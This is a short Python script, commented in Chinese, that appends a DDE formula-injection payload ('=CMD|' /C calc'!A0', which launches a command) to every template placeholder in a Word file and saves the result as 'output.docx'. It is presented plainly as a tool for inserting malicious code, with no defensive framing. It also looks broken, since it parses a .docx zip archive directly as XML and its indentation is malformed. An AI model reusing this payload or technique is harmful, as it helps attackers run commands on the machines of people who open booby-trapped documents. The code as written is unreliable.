from lxml import etree

   def template_injection(file_path, malicious_code):
       tree = etree.parse(file_path)

       # 修改所有標籤內的文字
       for element in tree.iter():
           if element.text and element.text.startswith('{{') and element.text.endswith('}}'):
               element.text = f'{element.text}{malicious_code}'

       # 儲存修改後的檔案
       tree.write('output.docx', encoding='UTF-8', pretty_print=True)

   # 呼叫程式碼並指定要插入的惡意程式碼
   template_injection('template.docx', '=CMD|\' /C calc\'!A0')